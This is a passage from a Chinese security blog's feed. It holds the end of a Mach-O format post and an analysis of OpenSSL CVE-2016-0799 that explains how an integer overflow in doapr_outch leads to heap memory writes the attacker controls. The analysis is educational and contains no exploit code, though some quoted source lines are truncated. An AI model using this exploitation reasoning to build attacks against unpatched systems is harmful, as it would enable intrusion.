class="comment">/* number of relocation entries */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	flags;		<span class="comment">/* flags (section type and attributes)*/</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	reserved1;	<span class="comment">/* reserved (for offset or index) */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	reserved2;	<span class="comment">/* reserved (for count or sizeof) */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> section_64 &#123; <span class="comment">/* for 64-bit architectures */</span></span><br><span class="line">	<span class="keyword">char</span>		sectname[<span class="number">16</span>];	<span class="comment">/* name of this section */</span></span><br><span class="line">	<span class="keyword">char</span>		segname[<span class="number">16</span>];	<span class="comment">/* segment this section goes in */</span></span><br><span class="line">	<span class="keyword">uint64_t</span>	addr;		<span class="comment">/* memory address of this section */</span></span><br><span class="line">	<span class="keyword">uint64_t</span>	size;		<span class="comment">/* size in bytes of this section */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	offset;		<span class="comment">/* file offset of this section */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	align;		<span class="comment">/* section alignment (power of 2) */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	reloff;		<span class="comment">/* file offset of relocation entries */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	nreloc;		<span class="comment">/* number of relocation entries */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	flags;		<span class="comment">/* flags (section type and attributes)*/</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	reserved1;	<span class="comment">/* reserved (for offset or index) */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	reserved2;	<span class="comment">/* reserved (for count or sizeof) */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	reserved3;	<span class="comment">/* reserved */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>除了同样有帮助内存映射的变量外，在了解Mach-O格式的时候，只需要知道不同的Section有着不同的作用就可以了。</p>
<table>
<thead>
<tr>
<th>Section</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>__text</td>
<td>代码</td>
</tr>
<tr>
<td>__cstring</td>
<td>硬编码的字符串</td>
</tr>
<tr>
<td>__const</td>
<td>const 关键词修饰过的变量</td>
</tr>
<tr>
<td>__DATA.__bss</td>
<td>bss段</td>
</tr>
</tbody>
</table>
<p>因为section类型已经是最小的分类了，还有更多复杂section段就不一一例举了，遇到没见过的section类型可以自行查找Apple文档。</p>
<h1 id="0x05_小结">0x05 小结</h1><p>通过对Mach-O格式的仔细分析，可以更好的理解Mach-O文件的加载过程，为研究dyld或者其他OS X系统下的模块打好基础。</p>
<h1 id="参考">参考</h1><p>1.mach-o文件加载的全过程(1)</p>
<p><a href="http://dongaxis.github.io/2015/01/01/mac-o%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BD%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B-1/" target="_blank" rel="external">http://dongaxis.github.io/2015/01/01/mac-o%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BD%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B-1/</a></p>
<p>2.Mach-O 可执行文件</p>
<p><a href="http://objccn.io/issue-6-3/" target="_blank" rel="external">http://objccn.io/issue-6-3/</a></p>
<p>3.iPhone Mach-O文件格式与代码签名</p>
<p><a href="http://zhiwei.li/text/2012/02/15/iphone-mach-o%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E4%B8%8E%E4%BB%A3%E7%A0%81%E7%AD%BE%E5%90%8D/" target="_blank" rel="external">http://zhiwei.li/text/2012/02/15/iphone-mach-o%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E4%B8%8E%E4%BB%A3%E7%A0%81%E7%AD%BE%E5%90%8D/</a></p>
<p>4.Dynamic Linking of Imported Functions in Mach-O</p>
<p><a href="http://www.codeproject.com/Articles/187181/Dynamic-Linking-of-Imported-Functions-in-Mach-O" target="_blank" rel="external">http://www.codeproject.com/Articles/187181/Dynamic-Linking-of-Imported-Functions-in-Mach-O</a></p>
<p>5.otool详解Mach-o文件头部</p>
<p><a href="http://www.mc2lab.com/?p=68" target="_blank" rel="external">http://www.mc2lab.com/?p=68</a></p>
<h1 id="PS:">PS:</h1><p>更多文章可以在我的学习分享博客<a href="http://BLOGIMAGE/" target="_blank" rel="external">http://BLOGIMAGE/</a></p>
<p>希望可以多多交流，不足之处还希望大家可以给与指正：）</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><blockquote>
<p>人生无根蒂，飘如陌上尘。 分散逐风转，此已非常身。</p>
<p>— 陶渊明 《杂诗》</p>
</blockquote>
<p><code>mach-o</code>格式是OS X系统上的可执行文件格式，类似于windows的<code>PE</code>与linux的<code>ELF</code>，如果不彻底搞清楚<code>mach-o</code>的格式与相关知识，去做其他研究，无异于建造空中阁楼。</p>
<p>每个Mach-O文件斗包含一个Mach-O头，然后是载入命令(Load Commands),最后是数据块(Data)。</p>
<p>接下来就对整个Mach-O的格式做出详细的分析。</p>]]>
    
    </summary>
    
      <category term="mach-o" scheme="http://turingh.github.io/tags/mach-o/"/>
    
      <category term="osx" scheme="http://turingh.github.io/tags/osx/"/>
    
      <category term="OS X" scheme="http://turingh.github.io/categories/OS-X/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[CVE-2016-0799简单分析]]></title>
    <link href="http://turingh.github.io/2016/03/03/CVE-2016-0799%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/"/>
    <id>http://turingh.github.io/2016/03/03/CVE-2016-0799简单分析/</id>
    <published>2016-03-03T16:12:47.000Z</published>
    <updated>2016-03-24T03:35:35.000Z</updated>
    <content type="html"><![CDATA[<h1 id="0x00_内容简介">0x00 内容简介</h1><p>最近openssl又除了一系列问题，具体可以看<a href="https://drownattack.com/#faq-practical" target="_blank" rel="external">这里</a>。<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0799" target="_blank" rel="external">CVE-2016-0799</a>只是其中一个比较简单的漏洞。造成漏洞的原因主要有两个。</p>
<ul>
<li><code>doapr_outch</code>中有可能存在整数溢出导致申请内存大小为负数</li>
<li><code>doapr_outch</code>函数在申请内存失败时没有做异常处理</li>
</ul>
<a id="more"></a>
<h1 id="0x01_源码分析">0x01 源码分析</h1><p>首先，去<a href="githun.com">github</a>上找到了这一次漏洞修复的<a href="https://github.com/openssl/openssl/commit/9cb177301fdab492e4cfef376b28339afe3ef663" target="_blank" rel="external">commit</a>，可以看到主要修改的是<code>doapr_outch</code>函数。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/CVE-2016-0799/diff.png" alt="diff"></p>
<p>有了一个大致的了解之后，将代码切换到bug修复之前的版本。函数源码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">697</span> <span class="keyword">static</span> <span class="keyword">void</span>                                                     </span><br><span class="line"><span class="number">698</span> doapr_outch(<span class="keyword">char</span> **sbuffer,</span><br><span class="line"><span class="number">699</span>             <span class="keyword">char</span> **buffer, <span class="keyword">size_t</span> *currlen, <span class="keyword">size_t</span> *maxlen, <span class="keyword">int</span> c)</span><br><span class="line"><span class="number">700</span> &#123;</span><br><span class="line"><span class="number">701</span>     <span class="comment">/* If we haven't at least one buffer, someone has doe a big booboo */</span></span><br><span class="line"><span class="number">702</span>     assert(*sbuffer != <span class="literal">NULL</span> || buffer != <span class="literal">NULL</span>);</span><br><span class="line"><span class="number">703</span>             <span class="keyword">if</span> (*buffer == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="number">704</span>     <span class="comment">/* |currlen| must always be &lt;= |*maxlen| */</span></span><br><span class="line"><span class="number">705</span>     assert(*currlen &lt;= *maxlen);</span><br><span class="line"><span class="number">706</span> </span><br><span class="line"><span class="number">707</span>     <span class="keyword">if</span> (buffer &amp;&amp; *currlen == *maxlen) &#123;</span><br><span class="line"><span class="number">708</span>         *maxlen += <span class="number">1024</span>;</span><br><span class="line"><span class="number">709</span>         <span class="keyword">if</span> (*buffer == <span class="literal">NULL</span>) &#123;   </span><br><span class="line"><span class="number">710</span>             *buffer = OPENSSL_malloc(*maxl</span><br><span class="line"><span class="number">711</span>                 <span class="comment">/* Panic! Can't really do anything sensible. Just return */</span></span><br><span class="line"><span class="number">712</span>                 <span class="keyword">return</span>; <span class="comment">//这里没有做异常处理直接返回了</span></span><br><span class="line"><span class="number">713</span>             &#125;           </span><br><span class="line"><span class="number">714</span>             <span class="keyword">if</span> (*currlen &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="number">715</span>                 assert(*sbuffer != <span class="literal">NULL</span>);</span><br><span class="line"><span class="number">716</span>                 <span class="built_in">memcpy</span>(*buffer, *sbuffer, *currlen);</span><br><span class="line"><span class="number">717</span>             &#125;           </span><br><span class="line"><span class="number">718</span>             *sbuffer = <span class="literal">NULL</span>;</span><br><span class="line"><span class="number">719</span>         &#125; <span class="keyword">else</span> &#123;        </span><br><span class="line"><span class="number">720</span>             *buffer = OPENSSL_realloc(*buffer, *maxlen);</span><br><span class="line"><span class="number">721</span>             <span class="keyword">if</span> (!*buffer) &#123;</span><br><span class="line"><span class="number">722</span>                 <span class="comment">/* Panic! Can't really do anything sensible. Just return */</span></span><br><span class="line"><span class="number">723</span>                 <span class="keyword">return</span>; <span class="comment">//这里没有做异常处理直接返回了</span></span><br><span class="line"><span class="number">724</span>             &#125;           </span><br><span class="line"><span class="number">725</span>         &#125;               </span><br><span class="line"><span class="number">726</span>     &#125;                   </span><br><span class="line"><span class="number">727</span> </span><br><span class="line"><span class="number">728</span>     <span class="keyword">if</span> (*currlen &lt; *maxlen) &#123;</span><br><span class="line"><span class="number">729</span>         <span class="keyword">if</span> (*sbuffer)   </span><br><span class="line"><span class="number">730</span>             (*sbuffer)[(*currlen)++] = (<span class="keyword">char</span>)c;</span><br><span class="line"><span class="number">731</span>         <span class="keyword">else</span>            </span><br><span class="line"><span class="number">732</span>             (*buffer)[(*currlen)++] = (<span class="keyword">char</span>)c;</span><br><span class="line"><span class="number">733</span>     &#125;                   </span><br><span class="line"><span class="number">734</span> </span><br><span class="line"><span class="number">735</span>     <span class="keyword">return</span>;             </span><br><span class="line"><span class="number">736</span> &#125;</span><br></pre></td></tr></table></figure>
<p>我是看完了一篇<a href="https://guidovranken.wordpress.com/2016/02/27/openssl-cve-2016-0799-heap-corruption-via-bio_printf/" target="_blank" rel="external">国外的分析文章</a>之后了解了整个漏洞的流程，这里我就试图反向的思考一下这个漏洞。希望可以提高从代码补丁中寻找重现流程的能力。</p>
<h2 id="1-1_寻找内存改写的方式">1.1 寻找内存改写的方式</h2><p>因为通过补丁已经知道是<code>doapr_outch</code>函数导致的堆腐败问题，所以<code>doapr_outch</code>一定存在改写数据的代码段。可以看到除了728-734行代码是对内存的改写外，没有其他地方操作内存的内容了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">728</span>     <span class="keyword">if</span> (*currlen &lt; *maxlen) &#123;</span><br><span class="line"><span class="number">729</span>         <span class="keyword">if</span> (*sbuffer)   </span><br><span class="line"><span class="number">730</span>             (*sbuffer)[(*currlen)++] = (<span class="keyword">char</span>)c; <span class="comment">//这里</span></span><br><span class="line"><span class="number">731</span>         <span class="keyword">else</span>            </span><br><span class="line"><span class="number">732</span>             (*buffer)[(*currlen)++] = (<span class="keyword">char</span>)c; <span class="comment">//这里</span></span><br><span class="line"><span class="number">733</span>     &#125;</span><br></pre></td></tr></table></figure>
<p>这里改写内存的方式可以用伪代码简单总结一下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base[offset]=c</span><br></pre></td></tr></table></figure>
<p>所以想要向指定的内存写入数据的话需要控制<code>base</code>与<code>offset</code>两个参数。而写入的数据是<code>c</code>。如果控制了<code>base</code>与<code>offset</code>那么每次调用函数就可以改写一个字节。</p>
<p>如果是有经验的开发人员可以很容易看出外部在调用的时候一定是循环调用了<code>doapr_outch</code>，看一看函数调用处的代码。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">425</span> <span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line"><span class="number">426</span> fmtstr(<span class="keyword">char</span> **sbuffer,</span><br><span class="line"><span class="number">427</span>        <span class="keyword">char</span> **buffer,</span><br><span class="line"><span class="number">428</span>        <span class="keyword">size_t</span> *currlen,</span><br><span class="line"><span class="number">429</span>        <span class="keyword">size_t</span> *maxlen, <span class="keyword">const</span> <span class="keyword">char</span> *value, <span class="keyword">int</span> flags, <span class="keyword">int</span> min, <span class="keyword">int</span> max)</span><br><span class="line"><span class="number">430</span> &#123;</span><br><span class="line"><span class="number">431</span>     <span class="keyword">int</span> padlen, strln;</span><br><span class="line"><span class="number">432</span>     <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line"><span class="number">433</span> </span><br><span class="line"><span class="number">434</span>     <span class="keyword">if</span> (value == <span class="number">0</span>)</span><br><span class="line"><span class="number">435</span>         value = <span class="string">"&lt;NULL&gt;"</span>;</span><br><span class="line"><span class="number">436</span>     <span class="keyword">for</span> (strln = <span class="number">0</span>; value[strln]; ++strln) ;</span><br><span class="line"><span class="number">437</span>     padlen = min - strln;</span><br><span class="line"><span class="number">438</span>     <span class="keyword">if</span> (padlen &lt; <span class="number">0</span>)</span><br><span class="line"><span class="number">439</span>         padlen = <span class="number">0</span>;</span><br><span class="line"><span class="number">440</span>     <span class="keyword">if</span> (flags &amp; DP_F_MINUS)</span><br><span class="line"><span class="number">441</span>         padlen = -padlen;</span><br><span class="line"><span class="number">442</span> </span><br><span class="line"><span class="number">443</span>     <span class="keyword">while</span> ((padlen &gt; <span class="number">0</span>) &amp;&amp; (cnt &lt; max)) &#123;</span><br><span class="line"><span class="number">444</span>         doapr_outch(sbuffer, buffer, currlen, maxlen, <span class="string">' '</span>);</span><br><span class="line"><span class="number">445</span>         --padlen;</span><br><span class="line"><span class="number">446</span>         ++cnt;</span><br><span class="line"><span class="number">447</span>     &#125;</span><br><span class="line"><span class="number">448</span>     <span class="keyword">while</span> (*value &amp;&amp; (cnt &lt; max)) &#123;</span><br><span class="line"><span class="number">449</span>         doapr_outch(sbuffer, buffer, currlen, maxlen, *value++); <span class="comment">//这里！</span></span><br><span class="line"><span class="number">450</span>         ++cnt;</span><br><span class="line"><span class="number">451</span>     &#125;</span><br><span class="line"><span class="number">452</span>     ...</span><br><span class="line"><span class="number">453</span>  &#125;</span><br></pre></td></tr></table></figure>
<p>可以看到，确实是通过循环来改写内存的。</p>
<h2 id="1-2_副作用编程">1.2 副作用编程</h2><blockquote>
<p>函数副作用会给程序设计带来不必要的麻烦，给程序带来十分难以查找的错误，并且降低程序的可读性。严格的函数式语言要求函数必须无副作用。</p>
</blockquote>
<p>副作用编程带来的不必要麻烦有一句更通俗的话可以来说明。<strong>开发一时爽，调试火葬场</strong>。这里再来看一下</p>
<p><code>doapr_outch</code>的函数声明</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">doapr_outch</span><span class="params">(<span class="keyword">char</span> **, <span class="keyword">char</span> **, size_t *, size_t *, <span class="keyword">int</span>)</span></span>;</span><br></pre></td></tr></table></figure>
<p>从声明不难看出<code>sbuffer</code>，<code>buffer</code>，<code>currlen</code>，<code>maxlen</code>这几个参数在函数第n次运行时候如果被改变了，那么第n+1次运行的时候，这些参数将使用上次改变了的值。</p>
<p>再结合代码写入处内存改写的方式，就可以肯定<code>sbuffer</code>和<code>buffer</code>一定有一个或者全部被改写了，导致进入了意料之外的逻辑。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">728</span>     <span class="keyword">if</span> (*currlen &lt; *maxlen) &#123;</span><br><span class="line"><span class="number">729</span>         <span class="keyword">if</span> (*sbuffer)   </span><br><span class="line"><span class="number">730</span>             (*sbuffer)[(*currlen)++] = (<span class="keyword">char</span>)c; <span class="comment">//这里</span></span><br><span class="line"><span class="number">731</span>         <span class="keyword">else</span>            </span><br><span class="line"><span class="number">732</span>             (*buffer)[(*currlen)++] = (<span class="keyword">char</span>)c; <span class="comment">//这里</span></span><br><span class="line"><span class="number">733</span>     &#125;</span><br></pre></td></tr></table></figure>
<p>因为<code>Malloc</code>或者<code>Realloc</code>出来的地址一定不是可控的，而系统传进来的<code>sbuffer</code>也一定不可控，再结合上面的代码，如果<code>sbuffer</code>或者<code>buffer</code>指向<code>NULL</code>的话，基址就是固定的了。</p>
<p>718行的代码会将<code>sbuffer</code>设置为空指针。而<code>buffer</code>编程空指针只能是申请内存失败的时候。</p>
<p>在结合上728-733行代码，要做到这一步一定要满足的条件是<code>*sbuffer</code>与<code>*buffer</code>都指向<code>NULL</code>，导致代码进入改写<code>*buffer</code>为基址的内存块。其他任何情况都无法做到内存开始地址可控。</p>
<p>所以再分代码，<strong>看流程是否可能将<code>*sbuffer</code>与<code>*buffer</code>赋值为NULL</strong>。</p>
<h2 id="1-3_改写sbuffer与buffer">1.3 改写sbuffer与buffer</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">697</span> <span class="keyword">static</span> <span class="keyword">void</span>                                                     </span><br><span class="line"><span class="number">698</span> doapr_outch(<span class="keyword">char</span> **sbuffer,</span><br><span class="line"><span class="number">699</span>             <span class="keyword">char</span> **buffer, <span class="keyword">size_t</span> *currlen, <span class="keyword">size_t</span> *maxlen, <span class="keyword">int</span> c)</span><br><span class="line"><span class="number">700</span> &#123;</span><br><span class="line"><span class="number">701</span>     <span class="comment">/* If we haven't at least one buffer, someone has doe a big booboo */</span></span><br><span class="line"><span class="number">702</span>     assert(*sbuffer != <span class="literal">NULL</span> || buffer != <span class="literal">NULL</span>);</span><br><span class="line"><span class="number">703</span>             <span class="keyword">if</span> (*buffer == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="number">704</span>     <span class="comment">/* |currlen| must always be &lt;= |*maxlen| */</span></span><br><span class="line"><span class="number">705</span>     assert(*currlen &lt;= *maxlen);</span><br><span class="line"><span class="number">706</span> </span><br><span class="line"><span class="number">707</span>     <span class="keyword">if</span> (buffer &amp;&amp; *currlen == *maxlen) &#123;</span><br><span class="line"><span class="number">708</span>         *maxlen += <span class="number">1024</span>;</span><br><span class="line"><span class="number">709</span>         <span class="keyword">if</span> (*buffer == <span class="literal">NULL</span>) &#123;   </span><br><span class="line"><span class="number">710</span>             *buffer = OPENSSL_malloc(*maxl</span><br><span class="line"><span class="number">711</span>                 <span class="comment">/* Panic! Can't really do anything sensible. Just return */</span></span><br><span class="line"><span class="number">712</span>                 <span class="keyword">return</span>; <span class="comment">//这里没有做异常处理直接返回了</span></span><br><span class="line"><span class="number">713</span>             &#125;           </span><br><span class="line"><span class="number">714</span>             <span class="keyword">if</span> (*currlen &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="number">715</span>                 assert(*sbuffer != <span class="literal">NULL</span>);</span><br><span class="line"><span class="number">716</span>                 <span class="built_in">memcpy</span>(*buffer, *sbuffer, *currlen);</span><br><span class="line"><span class="number">717</span>             &#125;           </span><br><span class="line"><span class="number">718</span>             *sbuffer = <span class="literal">NULL</span>;<span class="comment">//这里！</span></span><br><span class="line">		...</span><br><span class="line"><span class="number">728</span>     <span class="keyword">if</span> (*currlen &lt; *maxlen) &#123;</span><br><span class="line"><span class="number">729</span>         <span class="keyword">if</span> (*sbuffer)   </span><br><span class="line"><span class="number">730</span>             (*sbuffer)[(*currlen)++] = (<span class="keyword">char</span>)c;</span><br><span class="line"><span class="number">731</span>         <span class="keyword">else</span>            </span><br><span class="line"><span class="number">732</span>             (*buffer)[(*currlen)++] = (<span class="keyword">char</span>)c;</span><br><span class="line"><span class="number">733</span>     &#125;                   </span><br><span class="line"><span class="number">734</span> </span><br><span class="line"><span class="number">735</span>     <span class="keyword">return</span>;             </span><br><span class="line"><span class="number">736</span> &#125;</span><br></pre></td></tr></table></figure>
<p>在循环调用<code>doapr_outch</code>之后，当<code>*currlen == *maxlen</code>成立的时候就会进入内存申请模块，因为<code>*buffer</code>还没有申请过所以进入上面一个分支，申请内存后将<code>*sbuffer</code>设为NULL。</p>
<p>还需要将<code>*buffer</code>设为NULL。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">707</span>     <span class="keyword">if</span> (buffer &amp;&amp; *currlen == *maxlen) &#123;</span><br><span class="line"><span class="number">708</span>         *maxlen += <span class="number">1024</span>;</span><br><span class="line"><span class="number">709</span>         <span class="keyword">if</span> (*buffer == <span class="literal">NULL</span>) &#123;   </span><br><span class="line"><span class="number">710</span>             *buffer = OPENSSL_malloc(*maxl</span><br><span class="line"><span class="number">711</span>                 <span class="comment">/* Panic! Can't really do anything sensible. Just return */</span></span><br><span class="line"><span class="number">712</span>                 <span class="keyword">return</span>; <span class="comment">//这里没有做异常处理直接返回了</span></span><br><span class="line"><span class="number">713</span>             &#125;           </span><br><span class="line"><span class="number">714</span>             <span class="keyword">if</span> (*currlen &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="number">715</span>                 assert(*sbuffer != <span class="literal">NULL</span>);</span><br><span class="line"><span class="number">716</span>                 <span class="built_in">memcpy</span>(*buffer, *sbuffer, *currlen);</span><br><span class="line"><span class="number">717</span>             &#125;           </span><br><span class="line"><span class="number">718</span>             *sbuffer = <span class="literal">NULL</span>;</span><br><span class="line"><span class="number">719</span>         &#125; <span class="keyword">else</span> &#123;        </span><br><span class="line"><span class="number">720</span>             *buffer = OPENSSL_realloc(*buffer, *maxlen);</span><br><span class="line"><span class="number">721</span>             <span class="keyword">if</span> (!*buffer) &#123;</span><br><span class="line"><span class="number">722</span>                 <span class="comment">/* Panic! Can't really do anything sensible. Just return */</span></span><br><span class="line"><span class="number">723</span>                 <span class="keyword">return</span>; <span class="comment">//这里没有做异常处理直接返回了</span></span><br><span class="line"><span class="number">724</span>             &#125;           </span><br><span class="line"><span class="number">725</span>         &#125;               </span><br><span class="line"><span class="number">726</span>     &#125;</span><br></pre></td></tr></table></figure>
<p>再一次<code>*currlen == *maxlen</code>之后，又会进入内存分配阶段，这次会进入<code>Realloc</code>的分支，那么只要<code>realloc</code>失败的话，<code>*buffer</code>就会被赋值为NULL。</p>
<p>最简单的情况就是堆上内存用完了，这个时候buffer就是NULL了，这个时候就可以根据currlen以及后续的c来改写目标地址的数据了。但是堆上内存用完，导致申请内存返回NULL，是一件不可控的事情。</p>
<p>那么除了这种情况，还有什么情况下，realloc会返回NULL呢。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">375</span>    <span class="function"><span class="keyword">void</span> *<span class="title">CRYPTO_realloc</span><span class="params">(<span class="keyword">void</span> *str, <span class="keyword">int</span> num, <span class="keyword">const</span> <span class="keyword">char</span> *file, <span class="keyword">int</span> line)</span></span><br><span class="line">376    </span>&#123;</span><br><span class="line"><span class="number">377</span>        <span class="keyword">void</span> *ret = <span class="literal">NULL</span>;</span><br><span class="line"><span class="number">378</span></span><br><span class="line"><span class="number">379</span>        <span class="keyword">if</span> (str == <span class="literal">NULL</span>)</span><br><span class="line"><span class="number">380</span>            <span class="keyword">return</span> CRYPTO_malloc(num, file, line);</span><br><span class="line"><span class="number">381</span></span><br><span class="line"><span class="number">382</span>        <span class="keyword">if</span> (num &lt;= <span class="number">0</span>)</span><br><span class="line"><span class="number">383</span>            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>
<p>可以注意到在708行，对*maxlen做了增加1024的操作，那么如果maxlen怎么1024之后超过int的范围，就会导致realloc传入的size是一个负数。这个时候buffer就会因为realloc的参数错误被设置为NULL。然后因为出错，函数退出。</p>
<h2 id="1-3_出错不处理">1.3 出错不处理</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">448</span>     <span class="keyword">while</span> (*value &amp;&amp; (cnt &lt; max)) &#123;</span><br><span class="line"><span class="number">449</span>         doapr_outch(sbuffer, buffer, currlen, maxlen, *value++); <span class="comment">//这里！</span></span><br><span class="line"><span class="number">450</span>         ++cnt;</span><br><span class="line"><span class="number">451</span>     &#125;</span><br></pre></td></tr></table></figure>
<p>从这里可以看到，<code>*buffer</code>被设置为NULL，返回出来了。但是外面的循环什么都没干，又继续执行了。</p>
<p>这个时候就可以做内存改写了。currlen与c都是与我们传递的字符串相关的，这个很好理解了。</p>
<h1 id="0x02_小结">0x02 小结</h1><ul>
<li>开发过程中出错一定要处理</li>
<li>数据类型不同，在隐形的转换时，一定要小心</li>
</ul>
<p>接下来要做的事情就是根据对漏洞的理解编写一个POC来调试。这样可以加深对漏洞的理解。在开发中也能更好的引以为戒。</p>
<h1 id="0x03_参考">0x03 参考</h1><p>1.OpenSSL CVE-2016-0799: heap corruption via BIO_printf</p>
<p><a href="https://guidovranken.wordpress.com/2016/02/27/openssl-cve-2016-0799-heap-corruption-via-bio_printf/" target="_blank" rel="external">https://guidovranken.wordpress.com/2016/02/27/openssl-cve-2016-0799-heap-corruption-via-bio_printf/</a></p>
<p>PS：</p>
<p>这是我的学习分享博客<a href="http://BLOGIMAGE/" target="_blank" rel="external">http://BLOGIMAGE/</a></p>
<p>欢迎大家来探讨，不足之处还请指正。</p>
<p>​    </p>
<p>​    </p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0x00_内容简介">0x00 内容简介</h1><p>最近openssl又除了一系列问题，具体可以看<a href="https://drownattack.com/#faq-practical">这里</a>。<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0799">CVE-2016-0799</a>只是其中一个比较简单的漏洞。造成漏洞的原因主要有两个。</p>
<ul>
<li><code>doapr_outch</code>中有可能存在整数溢出导致申请内存大小为负数</li>
<li><code>doapr_outch</code>函数在申请内存失败时没有做异常处理</li>
</ul>]]>
    
    </summary>
    
      <category term="heap" scheme="http://turingh.github.io/tags/heap/"/>
    
      <category term="openssl" scheme="http://turingh.github.io/tags/openssl/"/>
    
      <category term="CVE" scheme="http://turingh.github.io/categories/CVE/"/>
    
  </entry>
  
  <entry>
